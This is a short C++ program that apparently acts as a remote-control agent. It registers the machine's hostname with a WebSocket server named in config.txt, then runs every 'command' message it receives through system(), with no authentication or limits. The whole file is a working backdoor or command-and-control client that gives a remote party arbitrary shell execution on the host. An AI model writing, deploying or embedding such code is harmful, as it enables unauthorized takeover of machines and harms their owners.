#include <iostream>
#include <fstream>
#include <string>
#include <ixwebsocket/IXNetSystem.h>
#include <ixwebsocket/IXWebSocket.h>
#include <json.hpp>


using json = nlohmann::json;
using namespace std;


#ifdef _WIN32
    #include <Windows.h>
#else
    #include <unistd.h>
#endif

std::string getComputerName() {
    char name[256];
#ifdef _WIN32
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) {
        return std::string(name);
    }
#else
    if (gethostname(name, sizeof(name)) == 0) {
        return std::string(name);
    }
#endif
    return "Unknown";
}



int main(){
    string BASE_URL;

    ifstream file("config.txt");
    if(file){
        getline(file,BASE_URL);

    }else{
        cout << "Not open config.txt" << endl;
        return 1;
    }

    file.close();
    
    cout << BASE_URL << endl;

    ix::initNetSystem();
    ix::WebSocket webSocket;
    webSocket.setUrl("ws://"+BASE_URL+"/ws"); 

    
    bool isConnect = false;
    webSocket.setOnMessageCallback([&](const ix::WebSocketMessagePtr& msg) {
        if(msg->type == ix::WebSocketMessageType::Message){
            if(!isConnect){
                cout << "from server: " << msg->str << endl;
                isConnect = true;
            }else{
                json data = json::parse(msg->str);

                string type = data["type"];
                if(type == "command"){
                    string text = data["text"];
                    system(text.c_str());
                }
            }
        }
    });

    webSocket.start();

    
    string pc_name = getComputerName();

    while(true){
        if(isConnect){

        }else{
          webSocket.send(pc_name);  
          cout << pc_name << endl;
        }
        this_thread::sleep_for(std::chrono::seconds(1));
    }
    webSocket.stop();
    ix::uninitNetSystem();
    return 0;
}
